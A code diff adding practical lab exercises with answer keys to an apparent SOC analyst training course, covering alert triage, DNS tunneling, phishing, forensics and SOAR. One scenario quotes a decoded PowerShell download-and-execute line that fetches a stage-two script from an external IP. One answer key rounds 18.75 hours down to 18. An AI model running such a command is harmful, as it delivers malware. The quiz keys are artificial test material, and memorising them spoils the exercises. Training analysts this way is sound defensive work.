@@ -26576,6 +26576,43 @@ For each alert: read details, enrich IOCs, correlate events, classify (TP/FP/BTP
       "Collaboration with L2 analysts is essential",
       "Managing alert fatigue through breaks is crucial"
     ],
+    practicalExercise: {
+      title: "SOC Alert Triage Scenario",
+      description: "Practice prioritizing and triaging alerts during a SOC shift handover.",
+      steps: [
+        "Review the scenario and identify key details",
+        "Determine alert priorities based on severity and context",
+        "Decide on appropriate escalation actions",
+        "Document your triage decisions"
+      ],
+      labScenario: "You are an L1 SOC analyst starting your night shift at 18:00 UTC. During handover, the outgoing analyst briefs you on three open alerts: (1) A medium-severity brute force alert — 40 failed SSH attempts from IP 198.51.100.22 against server SRV-WEB-01, no successful login detected. (2) A high-severity EDR alert showing PowerShell spawned by winword.exe on workstation WS-FIN-03, user: j.martinez. (3) A low-severity firewall rule violation from a developer testing API endpoints on the staging environment. The outgoing analyst partially investigated the brute force alert but had no time for the EDR alert. Your SIEM queue shows 8 new unreviewed alerts.",
+      labQuestions: [
+        {
+          id: "salp-1.1-q1",
+          question: "Which of the three open alerts should you investigate first and why?",
+          answer: "EDR alert",
+          hint: "Consider which alert indicates the most dangerous behavior — a legitimate application spawning a command-line tool."
+        },
+        {
+          id: "salp-1.1-q2",
+          question: "What makes the PowerShell-from-Word scenario suspicious?",
+          answer: "child process",
+          hint: "Think about whether Word normally launches command-line interpreters during regular use."
+        },
+        {
+          id: "salp-1.1-q3",
+          question: "What action should you take for the developer's firewall violation?",
+          answer: "verify with developer",
+          hint: "Consider whether this is expected behavior and how you can confirm it."
+        },
+        {
+          id: "salp-1.1-q4",
+          question: "Before ending your shift, what must you prepare for the next analyst?",
+          answer: "handover report",
+          hint: "Think about what documentation ensures continuity between shifts."
+        }
+      ]
+    },
   },
   {
     id: "1.2",
@@ -26800,6 +26837,37 @@ Rapidly rotating IPs behind a domain (every 30-60 seconds)
       "Monitor query length, entropy, and response codes",
       "Passive DNS and WHOIS are essential for investigation"
     ],
+    practicalExercise: {
+      title: "DNS Tunneling Detection",
+      description: "Analyze DNS logs to identify potential data exfiltration via DNS tunneling.",
+      steps: [
+        "Review the DNS query patterns in the scenario",
+        "Identify anomalous characteristics in the queries",
+        "Determine the likely attack technique",
+        "Recommend detection and mitigation steps"
+      ],
+      labScenario: "Your DNS monitoring tool flags unusual activity from workstation WS-DEV-12 (user: k.patel). Over the past hour, the host made 1,200 DNS TXT queries to subdomains of 'data-sync.analytics-cdn.net'. The subdomain labels are 40-60 characters long and appear Base64-encoded (e.g., 'dXNlcm5hbWU6YWRtaW4scGFzc3dvcmQ6UEBzc3cwcmQh.data-sync.analytics-cdn.net'). Normal DNS activity for this host averages 15 queries per hour. WHOIS shows the domain was registered 3 days ago. The responses contain unusually large TXT records averaging 450 bytes each.",
+      labQuestions: [
+        {
+          id: "salp-2.2-q1",
+          question: "What attack technique do these DNS queries most likely indicate?",
+          answer: "DNS tunneling",
+          hint: "Consider the abnormal query volume, encoded subdomains, and large TXT responses."
+        },
+        {
+          id: "salp-2.2-q2",
+          question: "What two characteristics of the subdomain labels suggest encoded data?",
+          answer: "length and Base64",
+          hint: "Look at the character count and encoding pattern of the subdomain names."
+        },
+        {
+          id: "salp-2.2-q3",
+          question: "Why is the domain registration date significant for this investigation?",
+          answer: "newly registered",
+          hint: "Legitimate services typically use well-established domains, not ones created days ago."
+        }
+      ]
+    },
   },
   {
     id: "2.3",
@@ -26930,6 +26998,43 @@ event_id=4624 logon_type=10
       "Process chain analysis identifies suspicious spawning",
       "Optimize by filtering early with indexed fields"
     ],
+    practicalExercise: {
+      title: "SIEM Brute Force Investigation",
+      description: "Use SIEM query logic to investigate a brute force attack with lateral movement.",
+      steps: [
+        "Analyze the SIEM alert timeline",
+        "Identify the attack progression",
+        "Determine compromised accounts and systems",
+        "Recommend containment actions"
+      ],
+      labScenario: "Your SIEM correlation rule triggers: 'Brute Force Followed by Lateral Movement.' The timeline shows: At 02:15 UTC, 250 failed logon events (Event ID 4625) targeting the 'svc-backup' service account from internal IP 10.0.5.30 (workstation WS-IT-08). At 02:22 UTC, a successful logon (Event ID 4624, Logon Type 3) for 'svc-backup' from the same IP. At 02:28 UTC, 'svc-backup' initiates SMB connections to file servers FS-01, FS-02, and FS-03. At 02:35 UTC, PowerShell remoting sessions are established from FS-01 to domain controller DC-PROD-01.",
+      labQuestions: [
+        {
+          id: "salp-3.1-q1",
+          question: "What is the total time between the brute force start and domain controller access?",
+          answer: "20 minutes",
+          hint: "Calculate the time difference between the first failed logon at 02:15 and the DC access at 02:35."
+        },
+        {
+          id: "salp-3.1-q2",
+          question: "What Windows Event ID confirms the attacker successfully authenticated?",
+          answer: "4624",
+          hint: "This is the standard Windows event for a successful logon."
+        },
+        {
+          id: "salp-3.1-q3",
+          question: "Which system should be isolated first to prevent further compromise?",
+          answer: "DC-PROD-01",
+          hint: "Consider which compromised system has the highest potential impact on the entire domain."
+        },
+        {
+          id: "salp-3.1-q4",
+          question: "What type of account was targeted and why is that significant?",
+          answer: "service account",
+          hint: "Service accounts often have elevated privileges and rarely trigger lockout policies."
+        }
+      ]
+    },
   },
   {
     id: "3.2",
@@ -27090,6 +27195,37 @@ Get-AuthenticodeSignature "C:\\path\\to\\suspicious.exe"
       "Check path, parent, user context, and command line",
       "Office apps spawning CLI tools is a critical indicator"
     ],
+    practicalExercise: {
+      title: "Suspicious Process Investigation",
+      description: "Analyze a process chain on a Windows workstation to identify malicious activity.",
+      steps: [
+        "Review the process hierarchy described in the scenario",
+        "Identify abnormal parent-child relationships",
+        "Determine the likely attack vector",
+        "Recommend response actions"
+      ],
+      labScenario: "EDR alerts on workstation WS-ACCT-05 (user: l.garcia, Accounting dept). Sysmon Event ID 1 shows the following process chain: explorer.exe → outlook.exe → WINWORD.EXE → cmd.exe → powershell.exe. The PowerShell command line contains: 'powershell -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...'. The encoded command, when decoded, reveals: 'IEX (New-Object Net.WebClient).DownloadString("http://185.220.101.33/stage2.ps1")'. The download occurred at 09:45 UTC, and since then, the workstation has been beaconing to the same IP every 60 seconds on port 443.",
+      labQuestions: [
+        {
+          id: "salp-4.1-q1",
+          question: "Which parent-child process relationship is the strongest indicator of compromise?",
+          answer: "WINWORD to cmd",
+          hint: "Microsoft Word should not normally spawn command-line interpreters."
+        },
+        {
+          id: "salp-4.1-q2",
+          question: "What technique is the PowerShell command using to avoid detection?",
+          answer: "Base64 encoding",
+          hint: "Look at the '-enc' flag and the encoded string in the command line."
+        },
+        {
+          id: "salp-4.1-q3",
+          question: "What does the 60-second beaconing pattern indicate?",
+          answer: "C2 communication",
+          hint: "Regular, periodic outbound connections to an external IP suggest command and control activity."
+        }
+      ]
+    },
   },
   {
     id: "4.2",
@@ -27247,6 +27383,43 @@ Email headers tell how a message traveled from sender to recipient.
       "Mismatched From/Reply-To is a strong phishing indicator",
       "X-Originating-IP identifies true sending infrastructure"
     ],
+    practicalExercise: {
+      title: "Phishing Email Header Analysis",
+      description: "Examine email headers to determine if a suspicious message is a phishing attempt.",
+      steps: [
+        "Review the email header details in the scenario",
+        "Check authentication results (SPF, DKIM, DMARC)",
+        "Identify spoofing indicators",
+        "Assess the overall threat level"
+      ],
+      labScenario: "An employee in HR forwards a suspicious email to the SOC. The email claims to be from 'IT Security <itsecurity@yourcompany.com>' requesting an urgent password reset via a link. Header analysis reveals: From: itsecurity@yourcompany.com, Reply-To: support@yourcompany-reset.com, Return-Path: bounce@mail-server99.xyz, SPF: fail (sender IP 91.234.56.78 not authorized for yourcompany.com), DKIM: none, DMARC: fail. The link in the body points to 'https://yourcompany-reset.com/auth/login'. WHOIS shows yourcompany-reset.com was registered yesterday using privacy protection.",
+      labQuestions: [
+        {
+          id: "salp-5.1-q1",
+          question: "What is the strongest technical indicator that this email is spoofed?",
+          answer: "SPF fail",
+          hint: "Check which authentication mechanism confirms the sender IP is not authorized."
+        },
+        {
+          id: "salp-5.1-q2",
+          question: "Why is the Reply-To address suspicious?",
+          answer: "different domain",
+          hint: "Compare the From domain with the Reply-To domain — legitimate internal emails use the same domain."
+        },
+        {
+          id: "salp-5.1-q3",
+          question: "What should the SOC do with the phishing link before clicking it?",
+          answer: "sandbox analysis",
+          hint: "Never click suspicious links directly — use an isolated environment to analyze them safely."
+        },
+        {
+          id: "salp-5.1-q4",
+          question: "What organization-wide action should be taken immediately?",
+          answer: "block domain",
+          hint: "Prevent other employees from accessing the malicious domain."
+        }
+      ]
+    },
   },
   {
     id: "5.2",
@@ -27390,6 +27563,37 @@ When in doubt, escalate UP — it's easier to de-escalate than recover from dela
       "When in doubt, escalate UP",
       "Downgrades require documented justification"
     ],
+    practicalExercise: {
+      title: "Incident Severity Classification",
+      description: "Classify and prioritize multiple simultaneous security incidents.",
+      steps: [
+        "Review each incident described in the scenario",
+        "Apply severity classification criteria",
+        "Determine escalation requirements",
+        "Plan your response order"
+      ],
+      labScenario: "Three incidents arrive at your SOC within 10 minutes. Incident A: A web application firewall (WAF) detects SQL injection attempts against the customer portal — 50 blocked requests from a single IP, no successful exploitation confirmed. Incident B: EDR detects Mimikatz execution on domain controller DC-01 under the SYSTEM account at 03:00 AM — no maintenance window is scheduled. Incident C: DLP alerts that an employee in Marketing emailed a spreadsheet containing 200 customer records to a personal Gmail address. The employee claims it was accidental.",
+      labQuestions: [
+        {
+          id: "salp-6.1-q1",
+          question: "Which incident should be classified as Critical severity?",
+          answer: "Incident B",
+          hint: "Consider which incident involves the highest-value target and the most dangerous tool."
+        },
+        {
+          id: "salp-6.1-q2",
+          question: "Why is Mimikatz on a domain controller especially dangerous?",
+          answer: "credential dumping",
+          hint: "Think about what Mimikatz does and what a domain controller stores."
+        },
+        {
+          id: "salp-6.1-q3",
+          question: "What severity would you assign to the DLP incident and why?",
+          answer: "medium",
+          hint: "Customer data was exposed but the action appears unintentional — assess both impact and intent."
+        }
+      ]
+    },
   },
   {
     id: "6.2",
@@ -28638,6 +28842,37 @@ Physical       Provider    Provider    Provider
       "Focus on identity, configuration, and data-based detections",
       "Cloud investigations follow the same framework but with different artifacts"
     ],
+    practicalExercise: {
+      title: "Cloud Security Incident Investigation",
+      description: "Investigate unauthorized access to cloud resources using cloud-native logs.",
+      steps: [
+        "Analyze the CloudTrail events in the scenario",
+        "Identify the compromised credentials",
+        "Determine the scope of unauthorized access",
+        "Recommend remediation steps"
+      ],
+      labScenario: "AWS CloudTrail alerts show unusual API activity from IAM user 'dev-deploy' at 04:30 UTC. The user, normally active only during business hours (09:00-17:00 EST), made the following API calls: ListBuckets, GetBucketAcl on all S3 buckets, then PutBucketPolicy on 's3://company-financial-reports' changing the bucket to public-read. CloudTrail shows the requests originated from IP 45.33.32.156 (geolocated to Eastern Europe), while the user's normal activity comes from the corporate VPN range 10.0.0.0/8. Access Advisor shows 'dev-deploy' has never previously accessed S3 services.",
+      labQuestions: [
+        {
+          id: "salp-7.1-q1",
+          question: "What is the first indicator that the IAM user credentials are compromised?",
+          answer: "unusual source IP",
+          hint: "Compare the request origin to the user's normal access pattern."
+        },
+        {
+          id: "salp-7.1-q2",
+          question: "What is the most critical action the attacker performed?",
+          answer: "public bucket policy",
+          hint: "Which API call could expose sensitive data to the internet?"
+        },
+        {
+          id: "salp-7.1-q3",
+          question: "What is the first remediation step for the compromised IAM user?",
+          answer: "disable access keys",
+          hint: "Stop the bleeding first — prevent further unauthorized API calls."
+        }
+      ]
+    },
   },
   {
     id: "7.2",
@@ -29017,6 +29252,37 @@ Deliver intelligence to consumers:
       "Tailor products to the audience: strategic, operational, or tactical",
       "Feedback loops ensure intelligence stays relevant and effective"
     ],
+    practicalExercise: {
+      title: "Threat Intelligence IOC Correlation",
+      description: "Correlate threat intelligence indicators with internal telemetry to identify an active threat.",
+      steps: [
+        "Review the threat intelligence advisory",
+        "Search internal logs for matching IOCs",
+        "Assess the scope of potential compromise",
+        "Recommend response actions"
+      ],
+      labScenario: "Your threat intel platform ingests a flash advisory: APT group 'IronLotus' is targeting healthcare organizations using spear-phishing with malicious PDF attachments. Known IOCs include C2 domain 'health-updates.cloud-cdn.net', file hash (SHA256) 'a3f2b8c9d1e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0', and callback IP 103.75.201.44. You search your SIEM and find: (1) DNS logs show workstation WS-REC-03 queried 'health-updates.cloud-cdn.net' 2 hours ago. (2) The file hash matches a PDF opened by user 'r.johnson' in the Records department. (3) No connections to the callback IP are found in firewall logs.",
+      labQuestions: [
+        {
+          id: "salp-8.1-q1",
+          question: "How many of the three IOCs matched in your internal telemetry?",
+          answer: "2",
+          hint: "Count which IOCs were found — domain query, file hash, and callback IP."
+        },
+        {
+          id: "salp-8.1-q2",
+          question: "What does the absence of callback IP connections suggest?",
+          answer: "early stage",
+          hint: "If the malware hasn't reached out to C2 yet, where might it be in the attack lifecycle?"
+        },
+        {
+          id: "salp-8.1-q3",
+          question: "What is the priority action for workstation WS-REC-03?",
+          answer: "isolate",
+          hint: "With confirmed IOC matches, what prevents the threat from spreading?"
+        }
+      ]
+    },
   },
   {
     id: "8.2",
@@ -29419,6 +29685,43 @@ HASH: [SHA256 value]
       "Use working copies for analysis — never modify original evidence",
       "Essential free tools: Autopsy, FTK Imager, Volatility, KAPE"
     ],
+    practicalExercise: {
+      title: "Digital Forensics Evidence Collection",
+      description: "Apply forensic methodology to collect and preserve evidence from a compromised server.",
+      steps: [
+        "Review the incident details",
+        "Determine the order of evidence collection",
+        "Identify key forensic artifacts to examine",
+        "Ensure proper chain of custody"
+      ],
+      labScenario: "At 06:00 UTC, the NOC reports that web server SRV-WEB-02 is exhibiting unusual behavior: CPU usage spiked to 95%, and outbound traffic increased tenfold. Initial investigation reveals a webshell file '/var/www/html/uploads/cmd.php' created at 05:42 UTC. The Apache access logs show POST requests to this file from IP 192.0.2.100 every 30 seconds. The server hosts an e-commerce application processing credit card transactions. Memory analysis tools show a process 'kworker_update' (not a legitimate kernel worker) running with root privileges and listening on port 4444.",
+      labQuestions: [
+        {
+          id: "salp-9.1-q1",
+          question: "Following order of volatility, what evidence should you collect first?",
+          answer: "memory",
+          hint: "Volatile data disappears when the system is powered off — capture it before anything else."
+        },
+        {
+          id: "salp-9.1-q2",
+          question: "What type of malware is the 'cmd.php' file?",
+          answer: "webshell",
+          hint: "A PHP file in the uploads directory that accepts remote commands is a specific type of backdoor."
+        },
+        {
+          id: "salp-9.1-q3",
+          question: "Why is the process 'kworker_update' suspicious?",
+          answer: "fake kernel process",
+          hint: "Real kernel worker processes follow a specific naming convention and don't listen on high ports."
+        },
+        {
+          id: "salp-9.1-q4",
+          question: "Given the server processes credit cards, what compliance notification is required?",
+          answer: "PCI DSS",
+          hint: "Credit card data breaches trigger specific payment card industry requirements."
+        }
+      ]
+    },
   },
   {
     id: "9.2",
@@ -30416,6 +30719,37 @@ SOAR Components:
       "Start with enrichment automation before implementing response actions",
       "Both commercial (XSOAR, Splunk SOAR) and open-source (Shuffle, TheHive) options exist"
     ],
+    practicalExercise: {
+      title: "SOAR Playbook Design",
+      description: "Design an automated response playbook for a common SOC use case.",
+      steps: [
+        "Analyze the phishing scenario",
+        "Identify automation opportunities",
+        "Design the playbook decision logic",
+        "Define human approval checkpoints"
+      ],
+      labScenario: "Your SOC processes an average of 45 phishing reports daily. Currently, each report takes an analyst 25 minutes to investigate manually: checking the sender reputation, extracting and detonating URLs in a sandbox, verifying email authentication headers, searching for other recipients, and removing malicious emails from mailboxes. Management asks you to design a SOAR playbook to automate this workflow. The SOC uses Microsoft 365 for email, CrowdStrike for EDR, and VirusTotal for threat intelligence. Analysts should only be involved for confirmed threats requiring containment.",
+      labQuestions: [
+        {
+          id: "salp-10.1-q1",
+          question: "Which step in the manual process is the best candidate for full automation?",
+          answer: "URL sandbox",
+          hint: "Which step requires no human judgment and can be performed by API calls?"
+        },
+        {
+          id: "salp-10.1-q2",
+          question: "At what point in the playbook should a human analyst be required?",
+          answer: "before containment",
+          hint: "Automated analysis is safe, but taking action that affects users needs human approval."
+        },
+        {
+          id: "salp-10.1-q3",
+          question: "How much analyst time per day could this playbook save?",
+          answer: "18 hours",
+          hint: "Calculate: 45 reports × 25 minutes each, converted to hours."
+        }
+      ]
+    },
   },
   {
     id: "10.2",
